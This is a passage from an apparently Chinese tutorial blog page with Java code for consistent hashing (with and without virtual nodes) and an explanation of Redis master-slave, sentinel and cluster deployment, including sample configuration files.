class="string">&quot;192.168.0.1:8888&quot;</span>, <span class="string">&quot;192.168.0.2:8888&quot;</span>, </span><br><span class="line">      <span class="string">&quot;192.168.0.3:8888&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key表示服务器的hash值，value表示服务器</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SortedMap&lt;Integer, String&gt; sortedMap = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;Integer, String&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//程序初始化，将所有的服务器放入sortedMap中</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; servers.length; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> getHash(servers[i]);</span><br><span class="line">            System.out.println(<span class="string">&quot;[&quot;</span> + servers[i] + <span class="string">&quot;]加入集合中, 其Hash值为&quot;</span> + hash);</span><br><span class="line">            sortedMap.put(hash, servers[i]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到应当路由到的结点</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getServer</span><span class="params">(String key)</span> &#123;</span><br><span class="line">        <span class="comment">//得到该key的hash值</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> getHash(key);</span><br><span class="line">        <span class="comment">//得到大于该Hash值的所有Map</span></span><br><span class="line">        SortedMap&lt;Integer, String&gt; subMap = sortedMap.tailMap(hash);</span><br><span class="line">        <span class="keyword">if</span> (subMap.isEmpty()) &#123;</span><br><span class="line">            <span class="comment">//如果没有比该key的hash值大的，则从第一个node开始</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> sortedMap.firstKey();</span><br><span class="line">            <span class="comment">//返回对应的服务器</span></span><br><span class="line">            <span class="keyword">return</span> sortedMap.get(i);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//第一个Key就是顺时针过去离node最近的那个结点</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> subMap.firstKey();</span><br><span class="line">            <span class="comment">//返回对应的服务器</span></span><br><span class="line">            <span class="keyword">return</span> subMap.get(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用FNV1_32_HASH算法计算服务器的Hash值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getHash</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">16777619</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> (<span class="type">int</span>) <span class="number">2166136261L</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++)</span><br><span class="line">            hash = (hash ^ str.charAt(i)) * p;</span><br><span class="line">        hash += hash &lt;&lt; <span class="number">13</span>;</span><br><span class="line">        hash ^= hash &gt;&gt; <span class="number">7</span>;</span><br><span class="line">        hash += hash &lt;&lt; <span class="number">3</span>;</span><br><span class="line">        hash ^= hash &gt;&gt; <span class="number">17</span>;</span><br><span class="line">        hash += hash &lt;&lt; <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果算出来的值为负数则取其绝对值</span></span><br><span class="line">        <span class="keyword">if</span> (hash &lt; <span class="number">0</span>)</span><br><span class="line">            hash = Math.abs(hash);</span><br><span class="line">        <span class="keyword">return</span> hash;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        String[] keys = &#123;<span class="string">&quot;semlinker&quot;</span>, <span class="string">&quot;kakuqo&quot;</span>, <span class="string">&quot;fer&quot;</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; keys.length; i++)</span><br><span class="line">            System.out.println(<span class="string">&quot;[&quot;</span> + keys[i] + <span class="string">&quot;]的hash值为&quot;</span> + getHash(keys[i])</span><br><span class="line">                    + <span class="string">&quot;, 被路由到结点[&quot;</span> + getServer(keys[i]) + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>以上代码成功运行后，在控制台会输出以下结果：</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">[<span class="number">192.168.0.1</span>:<span class="number">8888</span>]加入集合中, 其Hash值为<span class="number">1326271016</span></span><br><span class="line">[<span class="number">192.168.0.2</span>:<span class="number">8888</span>]加入集合中, 其Hash值为<span class="number">1132535844</span></span><br><span class="line">[<span class="number">192.168.0.3</span>:<span class="number">8888</span>]加入集合中, 其Hash值为<span class="number">115798597</span></span><br><span class="line"></span><br><span class="line">[semlinker]的hash值为<span class="number">1549041406</span>, 被路由到结点[<span class="number">192.168.0.3</span>:<span class="number">8888</span>]</span><br><span class="line">[kakuqo]的hash值为<span class="number">463104755</span>, 被路由到结点[<span class="number">192.168.0.2</span>:<span class="number">8888</span>]</span><br><span class="line">[fer]的hash值为<span class="number">1677150790</span>, 被路由到结点[<span class="number">192.168.0.3</span>:<span class="number">8888</span>]</span><br></pre></td></tr></table></figure>



<h4 id="不带虚拟节点的一致性哈希算法实现-1"><a href="#不带虚拟节点的一致性哈希算法实现-1" class="headerlink" title="不带虚拟节点的一致性哈希算法实现"></a>不带虚拟节点的一致性哈希算法实现</h4><p>带虚拟节点的一致性哈希算法可以参考 <a href="https://link.segmentfault.com/?enc=upWwPl9YvlX5SiwVBKgQiA==.XEp7/IKgaClPvsi19twzlol5KfSc32CwQDGxBmaGs2vDqAZIqR54XQm3ELi4970rmWNK3Nw4w99jlazmI2uMIg==">一致性Hash(Consistent Hashing)原理剖析及Java实现</a> 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> hash;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> java.util.LinkedList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.SortedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.TreeMap;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> org.apache.commons.lang.StringUtils;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 带虚拟节点的一致性Hash算法</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConsistentHashingWithoutVirtualNode</span> &#123;</span><br><span class="line"> </span><br><span class="line">     <span class="comment">//待添加入Hash环的服务器列表</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> String[] servers = &#123;<span class="string">&quot;192.168.0.0:111&quot;</span>, <span class="string">&quot;192.168.0.1:111&quot;</span>, <span class="string">&quot;192.168.0.2:111&quot;</span>,</span><br><span class="line">             <span class="string">&quot;192.168.0.3:111&quot;</span>, <span class="string">&quot;192.168.0.4:111&quot;</span>&#125;;</span><br><span class="line">     </span><br><span class="line">     <span class="comment">//真实结点列表,考虑到服务器上线、下线的场景，即添加、删除的场景会比较频繁，这里使用LinkedList会更好</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; realNodes = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;String&gt;();</span><br><span class="line">     </span><br><span class="line">     <span class="comment">//虚拟节点，key表示虚拟节点的hash值，value表示虚拟节点的名称</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> SortedMap&lt;Integer, String&gt; virtualNodes = <span class="keyword">new</span> <span class="title class_">TreeMap</span>&lt;Integer, String&gt;();</span><br><span class="line">             </span><br><span class="line">     <span class="comment">//虚拟节点的数目，这里写死，为了演示需要，一个真实结点对应5个虚拟节点</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">VIRTUAL_NODES</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">static</span>&#123;</span><br><span class="line">         <span class="comment">//先把原始的服务器添加到真实结点列表中</span></span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;servers.length; i++)</span><br><span class="line">             realNodes.add(servers[i]);</span><br><span class="line">         </span><br><span class="line">         <span class="comment">//再添加虚拟节点，遍历LinkedList使用foreach循环效率会比较高</span></span><br><span class="line">         <span class="keyword">for</span> (String str : realNodes)&#123;</span><br><span class="line">             <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;VIRTUAL_NODES; i++)&#123;</span><br><span class="line">                 <span class="type">String</span> <span class="variable">virtualNodeName</span> <span class="operator">=</span> str + <span class="string">&quot;&amp;&amp;VN&quot;</span> + String.valueOf(i);</span><br><span class="line">                 <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> getHash(virtualNodeName);</span><br><span class="line">                 System.out.println(<span class="string">&quot;虚拟节点[&quot;</span> + virtualNodeName + <span class="string">&quot;]被添加, hash值为&quot;</span> + hash);</span><br><span class="line">                 virtualNodes.put(hash, virtualNodeName);</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">         System.out.println();</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     <span class="comment">//使用FNV1_32_HASH算法计算服务器的Hash值,这里不使用重写hashCode的方法，最终效果没区别</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">getHash</span><span class="params">(String str)</span>&#123;</span><br><span class="line">         <span class="keyword">final</span> <span class="type">int</span> <span class="variable">p</span> <span class="operator">=</span> <span class="number">16777619</span>;</span><br><span class="line">         <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> (<span class="type">int</span>)<span class="number">2166136261L</span>;</span><br><span class="line">         <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; str.length(); i++)</span><br><span class="line">             hash = (hash ^ str.charAt(i)) * p;</span><br><span class="line">         hash += hash &lt;&lt; <span class="number">13</span>;</span><br><span class="line">         hash ^= hash &gt;&gt; <span class="number">7</span>;</span><br><span class="line">         hash += hash &lt;&lt; <span class="number">3</span>;</span><br><span class="line">         hash ^= hash &gt;&gt; <span class="number">17</span>;</span><br><span class="line">         hash += hash &lt;&lt; <span class="number">5</span>;</span><br><span class="line">         </span><br><span class="line">         <span class="comment">// 如果算出来的值为负数则取其绝对值</span></span><br><span class="line">         <span class="keyword">if</span> (hash &lt; <span class="number">0</span>)</span><br><span class="line">             hash = Math.abs(hash);</span><br><span class="line">         <span class="keyword">return</span> hash;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     <span class="comment">//得到应当路由到的结点</span></span><br><span class="line">     <span class="keyword">private</span> <span class="keyword">static</span> String <span class="title function_">getServer</span><span class="params">(String key)</span>&#123;</span><br><span class="line">        <span class="comment">//得到该key的hash值</span></span><br><span class="line">         <span class="type">int</span> <span class="variable">hash</span> <span class="operator">=</span> getHash(key);</span><br><span class="line">         <span class="comment">// 得到大于该Hash值的所有Map</span></span><br><span class="line">         SortedMap&lt;Integer, String&gt; subMap = virtualNodes.tailMap(hash);</span><br><span class="line">         String virtualNode;</span><br><span class="line">         <span class="keyword">if</span>(subMap.isEmpty())&#123;</span><br><span class="line">            <span class="comment">//如果没有比该key的hash值大的，则从第一个node开始</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> virtualNodes.firstKey();</span><br><span class="line">            <span class="comment">//返回对应的服务器</span></span><br><span class="line">            virtualNode = virtualNodes.get(i);</span><br><span class="line">         &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//第一个Key就是顺时针过去离node最近的那个结点</span></span><br><span class="line">            <span class="type">Integer</span> <span class="variable">i</span> <span class="operator">=</span> subMap.firstKey();</span><br><span class="line">            <span class="comment">//返回对应的服务器</span></span><br><span class="line">            virtualNode = subMap.get(i);</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="comment">//virtualNode虚拟节点名称要截取一下</span></span><br><span class="line">         <span class="keyword">if</span>(StringUtils.isNotBlank(virtualNode))&#123;</span><br><span class="line">             <span class="keyword">return</span> virtualNode.substring(<span class="number">0</span>, virtualNode.indexOf(<span class="string">&quot;&amp;&amp;&quot;</span>));</span><br><span class="line">         &#125;</span><br><span class="line">         <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">         String[] keys = &#123;<span class="string">&quot;太阳&quot;</span>, <span class="string">&quot;月亮&quot;</span>, <span class="string">&quot;星星&quot;</span>&#125;;</span><br><span class="line">         <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;keys.length; i++)</span><br><span class="line">             System.out.println(<span class="string">&quot;[&quot;</span> + keys[i] + <span class="string">&quot;]的hash值为&quot;</span> +</span><br><span class="line">                     getHash(keys[i]) + <span class="string">&quot;, 被路由到结点[&quot;</span> + getServer(keys[i]) + <span class="string">&quot;]&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>



<h2 id="Redis高可用（主从、哨兵、集群）"><a href="#Redis高可用（主从、哨兵、集群）" class="headerlink" title="Redis高可用（主从、哨兵、集群）"></a>Redis高可用（主从、哨兵、集群）</h2><h3 id="主从模式"><a href="#主从模式" class="headerlink" title="主从模式"></a>主从模式</h3><p>一般，系统的高可用都是通过部署多台机器实现的。redis 为了避免单点故障，也需要部署多台机器。</p>
<p>因为部署了多台机器，所以就会涉及到不同机器的的数据同步问题。为此，redis 提供了 Redis 提供了复制(replication)功能，当一台 redis 数据库中的数据发生了变化，这个变化会被自动的同步到其他的 redis 机器上去。</p>
<p>redis 多机器部署时，这些机器节点会被分成两类，一类是主节点（master 节点），一类是从节点（slave 节点）。一般主节点可以进行读、写操作，而从节点只能进行读操作。同时由于主节点可以写，数据会发生变化，当主节点的数据发生变化时，会将变化的数据同步给从节点，这样从节点的数据就可以和主节点的数据保持一致了。一个主节点可以有多个从节点，但是一个从节点会只会有一个主节点，也就是所谓的一主多从结构。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282331731.png" alt="img"></p>
<h4 id="机器规划"><a href="#机器规划" class="headerlink" title="机器规划"></a>机器规划</h4><table>
<thead>
<tr>
<th>机器名称</th>
<th>IP</th>
<th>端口</th>
</tr>
</thead>
<tbody><tr>
<td>master</td>
<td>192.168.1.10</td>
<td>6379</td>
</tr>
<tr>
<td>slave1</td>
<td>192.168.1.11</td>
<td>6379</td>
</tr>
<tr>
<td>slave2</td>
<td>192.168.1.12</td>
<td>6379</td>
</tr>
<tr>
<td>slave3</td>
<td>192.168.1.13</td>
<td>6379</td>
</tr>
</tbody></table>
<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p><strong>主节点配置</strong></p>
<p>主节点按照正常的配置配好即可。</p>
<p><strong>从节点配置</strong></p>
<p>使用默认的配置启动机器，机器都是主节点。如果想要让机器变成从节点，需要在 conf 服务器上配置主从复制的相关参数。</p>
<ul>
<li>在从节点的配置文件 redis.conf 中指定主节点的信息（如果需要的话，可以配置主节点的登录密码，主从复制相关的参数）。三台从节点的配置是一样的。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置主节点的ip和端口</span></span><br><span class="line">slaveof 192.168.1.10 6379</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">从redis2.6开始，从节点默认是只读的</span></span><br><span class="line">slave-read-only yes</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">假设主节点有登录密码，是123456</span></span><br><span class="line">masterauth 123456</span><br></pre></td></tr></table></figure>

<ul>
<li>也可以不配置上面的文件，使用 redis-server 命令，在启动从节点时，通过参数–slaveof 指定主节点是谁。</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">./redis-server --slaveof 192.168.1.10 6379</span><br></pre></td></tr></table></figure>

<p>系统运行时，如果 master 挂掉了，可以在一个从库（如 slave1）上手动执行命令<code>slaveof no one</code>，将 slave1 变成新的 master；在 slave2 和 slave3 上分别执行<code>slaveof 192.168.1.11 6379</code> 将这两个机器的主节点指向的这个新的 master；同时，挂掉的原 master 启动后作为新的 slave 也指向新的 master 上。</p>
<p>执行命令<code>slaveof no one</code>命令，可以关闭从服务器的复制功能。同时原来同步的所得的数据集都不会被丢弃。</p>
<h4 id="机器启动"><a href="#机器启动" class="headerlink" title="机器启动"></a>机器启动</h4><p>首先启动主节点，然后一台一台启动从节点。</p>
<h4 id="主从复制的机制"><a href="#主从复制的机制" class="headerlink" title="主从复制的机制"></a>主从复制的机制</h4><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282332056.png" alt="img"></p>
<ul>
<li>从数据库连接主数据库，发送 SYNC 命令。</li>
<li>主数据库接收到 SYNC 命令后，可以执行 BGSAVE 命令生成 RDB 文件并使用缓冲区记录此后执行的所有写命令。</li>
<li>主数据库 BGSAVE 执行完后，向所有从数据库发送快照文件，并在发送期间继续记录被执行的写命令。</li>
<li>从数据库收到快照文件后丢弃所有旧数据，载入收到的快照。</li>
<li>主数据库快照发送完毕后开始向从数据库发送缓冲区中的写命令。</li>
<li>从数据库完成对快照的载入，开始接受命令请求，并执行来自主数据库缓冲区的写命令。(<strong>从数据库初始化完成</strong>)</li>
<li>主数据库每执行一个写命令就会向从数据库发送相同的写命令，从数据库接收并执行收到的写命令。(<strong>从数据库初始化完成后的操作</strong>)</li>
<li>出现断开重连后，2.8 之后的版本会将断线期间的命令传给从数据库，增量复制。</li>
<li><strong>主从刚刚连接的时候，进行全量同步。全同步结束后，进行增量同步</strong>。当然，如果有需要，slave 在任何时候都可以发起全量同步。Redis 的策略是，无论如何，首先会尝试进行增量同步，如不成功，要求从机进行全量同步。</li>
</ul>
<h4 id="主从模式的优缺点"><a href="#主从模式的优缺点" class="headerlink" title="主从模式的优缺点"></a>主从模式的优缺点</h4><h5 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h5><ul>
<li>支持主从复制，主机会自动将数据同步到从机，可以进行读写分离;</li>
<li>为了分载 Master 的读操作压力，Slave 服务器可以为客户端提供只读操作的服务，写服务依然必须由 Master 来完成;</li>
<li>Slave 同样可以接受其他 Slaves 的连接和同步请求，这样可以有效地分载 Master 的同步压力;</li>
<li>Master 是以非阻塞的方式为 Slaves 提供服务。所以在 Master-Slave 同步期间，客户端仍然可以提交查询或修改请求;</li>
<li>Slave 同样是以非阻塞的方式完成数据同步。在同步期间，如果有客户端提交查询请求，Redis 则返回同步之前的数据。</li>
</ul>
<h5 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h5><ul>
<li>Redis 不具备自动容错和恢复功能，主机从机的宕机都会导致前端部分读写请求失败，需要等待机器重启或者手动切换前端的 IP 才能恢复。</li>
<li>主机宕机，宕机前有部分数据未能及时同步到从机，切换 IP 后还会引入数据不一致的问题，降低了系统的可用性。</li>
<li>如果多个 Slave 断线了，需要重启的时候，尽量不要在同一时间段进行重启。因为只要 Slave 启动，就会发送 sync 请求和主机全量同步，当多个 Slave 重启的时候，可能会导致 Master IO 剧增从而宕机。</li>
<li>Redis 较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂。</li>
<li>Redis 的主节点和从节点中的数据是一样的，降低了内存的可用性。</li>
</ul>
<h3 id="哨兵模式"><a href="#哨兵模式" class="headerlink" title="哨兵模式"></a>哨兵模式</h3><p>主从模式下，当主服务器宕机后，需要手动把一台从服务器切换为主服务器，这就需要人工干预，费事费力，还会造成一段时间内服务不可用。这种方式并不推荐，实际生产中，优先考虑哨兵模式。这种模式下，master 宕机，哨兵会自动选举 master 并将其他的 slave 指向新的 master。</p>
<p>在主从模式下，Redis 同时提供了哨兵命令redis-sentinel，哨兵是一个独立的进程，作为进程，它会独立运行。其原理是哨兵进程向所有的 Redis 机器发送命令，等待 Redis 服务器响应，从而监控运行的多个 Redis 实例。</p>
<p>哨兵可以有多个，一般为了便于决策选举，使用奇数个哨兵。哨兵可以和 Redis 机器部署在一起，也可以部署在其他的机器上。多个哨兵构成一个哨兵集群，哨兵直接也会相互通信，检查哨兵是否正常运行，同时发现 master 宕机哨兵之间会进行决策选举新的 master。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282332575.png" alt="img"></p>
<p>哨兵模式的作用:</p>
<ul>
<li>通过发送命令，让 Redis 服务器返回监控其运行状态，包括主服务器和从服务器。</li>
<li>当哨兵监测到 master 宕机，会自动将 slave 切换到 master，然后通过发布订阅模式通知其他的从服务器，修改配置文件，让它们切换主机。</li>
<li>然而一个哨兵进程对 Redis 服务器进行监控，也可能会出现问题，为此，我们可以使用多个哨兵进行监控。各个哨兵之间还会进行监控，这样就形成了多哨兵模式。</li>
</ul>
<p>哨兵很像 kafka 集群中的 zookeeper 的功能。</p>
<h4 id="机器规划-1"><a href="#机器规划-1" class="headerlink" title="机器规划"></a>机器规划</h4><table>
<thead>
<tr>
<th>机器名称</th>
<th>IP</th>
<th>端口</th>
</tr>
</thead>
<tbody><tr>
<td>master</td>
<td>192.168.1.10</td>
<td>6379</td>
</tr>
<tr>
<td>slave1</td>
<td>192.168.1.11</td>
<td>6379</td>
</tr>
<tr>
<td>slave2</td>
<td>192.168.1.12</td>
<td>6379</td>
</tr>
<tr>
<td>slave3</td>
<td>192.168.1.13</td>
<td>6379</td>
</tr>
<tr>
<td>sentinel1</td>
<td>192.168.1.14</td>
<td>6379</td>
</tr>
<tr>
<td>sentinel2</td>
<td>192.168.1.15</td>
<td>6379</td>
</tr>
<tr>
<td>sentinel3</td>
<td>192.168.1.16</td>
<td>6379</td>
</tr>
</tbody></table>
<p>这里将哨兵进程和 redis 分别部署在不同的机器上，避免因为 redis 宕机导致 sentinel 进程不可用。</p>
<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>redis.conf 的配置和上面主从模式一样，不用变。这里主要说一下哨兵的配置。</p>
<p>每台机器的哨兵进程都需要一个哨兵的配置文件<code>sentinel.conf</code>，三台机器的哨兵配置是一样的。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">禁止保护模式</span></span><br><span class="line">protected-mode no</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置监听的主服务器，这里sentinel monitor代表监控，mymaster代表服务器的名称，可以自定义，</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">192.168.1.10代表监控的主服务器，6379代表端口，2代表只有两个或两个以上的哨兵认为主服务器不可用的时候，才会进行failover操作。</span></span><br><span class="line">sentinel monitor mymaster 192.168.1.10 6379 2</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sentinel author-pass定义服务的密码，mymaster是服务名称，123456是Redis服务器密码</span></span><br><span class="line">sentinel auth-pass mymaster 123456</span><br></pre></td></tr></table></figure>

<h4 id="机器启动-1"><a href="#机器启动-1" class="headerlink" title="机器启动"></a>机器启动</h4><p>首先启动主节点，然后一台一台启动从节点。</p>
<p>redis 集群启动完成后，分别启动哨兵集群所在机器的三个哨兵，使用<code>redis-sentinel /path/to/sentinel.conf</code>命令。</p>
<h4 id="哨兵模式的工作"><a href="#哨兵模式的工作" class="headerlink" title="哨兵模式的工作"></a>哨兵模式的工作</h4><ul>
<li>每个 Sentinel（哨兵）进程以每秒钟一次的频率向整个集群中的 Master 主服务器，Slave 从服务器以及其他 Sentinel（哨兵）进程发送一个 PING 命令。</li>
<li>如果一个实例（instance）距离最后一次有效回复 PING 命令的时间超过 down-after-milliseconds 选项所指定的值， 则这个实例会被 Sentinel（哨兵）进程标记为主观下线（SDOWN）。</li>
<li>如果一个 Master 主服务器被标记为主观下线（SDOWN），则正在监视这个 Master 主服务器的所有 Sentinel（哨兵）进程要以每秒一次的频率确认 Master 主服务器的确进入了主观下线状态。</li>
<li>当有足够数量的 Sentinel（哨兵）进程（大于等于配置文件指定的值）在指定的时间范围内确认 Master 主服务器进入了主观下线状态（SDOWN）， 则 Master 主服务器会被标记为客观下线（ODOWN）。</li>
<li>在一般情况下，每个 Sentinel（哨兵）进程会以每 10 秒一次的频率向集群中的所有 Master 主服务器、Slave 从服务器发送 INFO 命令。</li>
<li>当 Master 主服务器被 Sentinel（哨兵）进程标记为客观下线（ODOWN）时，Sentinel（哨兵）进程向下线的 Master 主服务器的所有 Slave 从服务器发送 INFO 命令的频率会从 10 秒一次改为每秒一次。</li>
<li>若没有足够数量的 Sentinel（哨兵）进程同意 Master 主服务器下线， Master 主服务器的客观下线状态就会被移除。若 Master 主服务器重新向 Sentinel（哨兵）进程发送 PING 命令返回有效回复，Master 主服务器的主观下线状态就会被移除。</li>
</ul>
<p>假设 master 宕机，sentinel1 先检测到这个结果，系统并不会马上进行 failover（故障转移）选出新的 master，仅仅是 sentinel 1 主观的认为 master 不可用，这个现象成为<strong>主观下线</strong>。当后面的哨兵也检测到主服务器不可用，并且数量达到一定值时，那么哨兵之间就会进行一次投票，投票的结果由 sentinel 1 发起，进行 failover 操作。切换成功后，就会通过发布订阅模式，让各个哨兵把自己监控的从服务器实现切换主机，这个过程称为<strong>客观下线</strong>。这样对于客户端而言，一切都是透明的。</p>
<h4 id="主从模式的优缺点-1"><a href="#主从模式的优缺点-1" class="headerlink" title="主从模式的优缺点"></a>主从模式的优缺点</h4><h5 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h5><ul>
<li>哨兵模式是基于主从模式的，所有主从的优点，哨兵模式都具有。</li>
<li>主从可以自动切换，系统更健壮，可用性更高。</li>
</ul>
<h5 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h5><ul>
<li>具有主从模式的缺点，每台机器上的数据是一样的，内存的可用性较低。</li>
<li>Redis 较难支持在线扩容，在集群容量达到上限时在线扩容会变得很复杂。</li>
</ul>
<h3 id="集群模式"><a href="#集群模式" class="headerlink" title="集群模式"></a>集群模式</h3><p>先说一个误区：<strong>Redis 的集群模式本身没有使用一致性 hash 算法，而是使用 slots 插槽</strong>。这是很多人的一个误区。这里先留个坑，后面我会出一期《 redis 系列之——一致性 hash 算法》。</p>
<p>Redis 的哨兵模式基本已经可以实现高可用，读写分离，但是在这种模式下每台 Redis 服务器都存储相同的数据，很浪费内存，所以在 redis3.0 上加入了 Cluster 集群模式，实现了 Redis 的分布式存储，对数据进行分片，也就是说每台 Redis 节点上存储不同的内容。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202282332079.png" alt="img"></p>
<p>这里的 6 台 redis 两两之间并不是独立的，每个节点都会通过集群总线(cluster bus)，与其他的节点进行通信。通讯时使用特殊的端口号，即对外服务端口号加 10000。例如如果某个 node 的端口号是 6379，那么它与其它 nodes 通信的端口号是 16379。nodes 之间的通信采用特殊的二进制协议。</p>
<p>对客户端来说，整个 cluster 被看做是一个整体，客户端可以连接任意一个 node 进行操作，就像操作单一 Redis 实例一样，当客户端操作的 key 没有分配到该 node 上时，Redis 会返回转向指令，指向正确的 node，这有点儿像浏览器页面的 302 redirect 跳转。</p>
<p>根据官方推荐，集群部署至少要 3 台以上的 master 节点，最好使用 3 主 3 从六个节点的模式。测试时，也可以在一台机器上部署这六个实例，通过端口区分出来。</p>
<h4 id="机器规划-2"><a href="#机器规划-2" class="headerlink" title="机器规划"></a>机器规划</h4><table>
<thead>
<tr>
<th>机器名称</th>
<th>IP</th>
<th>端口</th>
</tr>
</thead>
<tbody><tr>
<td>master1</td>
<td>192.168.1.11</td>
<td>6379</td>
</tr>
<tr>
<td>master2</td>
<td>192.168.1.12</td>
<td>6379</td>
</tr>
<tr>
<td>master3</td>
<td>192.168.1.13</td>
<td>6379</td>
</tr>
<tr>
<td>slave1</td>
<td>192.168.1.21</td>
<td>6379</td>
</tr>
<tr>
<td>slave2</td>
<td>192.168.1.22</td>
<td>6379</td>
</tr>
<tr>
<td>slave3</td>
<td>192.168.1.23</td>
<td>6379</td>
</tr>
</tbody></table>
<h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h4><p>修改<code>redis.conf</code> 的配置文件:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启redis的集群模式</span></span><br><span class="line">cluster-enabled yes</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">配置集群模式下的配置文件名称和位置,redis-cluster.conf这个文件是集群启动后自动生成的，不需要手动配置。</span></span><br><span class="line">cluster-config-file redis-cluster.conf</span><br></pre></td></tr></table></figure>

